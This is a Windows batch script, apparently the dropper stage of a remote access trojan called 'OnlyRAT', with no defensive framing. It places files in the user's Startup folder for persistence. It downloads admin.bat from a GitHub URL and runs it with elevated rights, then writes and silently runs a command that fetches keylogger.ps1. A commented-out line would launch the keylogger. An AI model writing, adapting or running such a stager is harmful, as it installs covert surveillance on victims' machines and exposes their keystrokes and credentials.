@echo off

set "initialPath=%cd%"

set "startup=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

cd /d "%startup%"

powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/admin.bat', '%startup%\admin.bat')"
powershell -c "Start-Process cmd.exe -ArgumentList '/c \"%startup%\admin.bat\"' -Verb RunAs"

timeout /t 10 > nul

powershell -Command "if (-not (Test-Path 'C:\NewDirectory')) { New-Item -Path 'C:\NewDirectory' -ItemType Directory }"

(
  echo powershell -c "Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/keylogger.ps1\" -OutFile \"wget2.ps1\""
) > wget.cmd

powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\wget.cmd\"' -WindowStyle Hidden"

timeout /t 5 > nul

@REM powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\wget2.ps1\"' -WindowStyle Hidden"

cd /d "%initialPath%"

@REM del initial.cmd
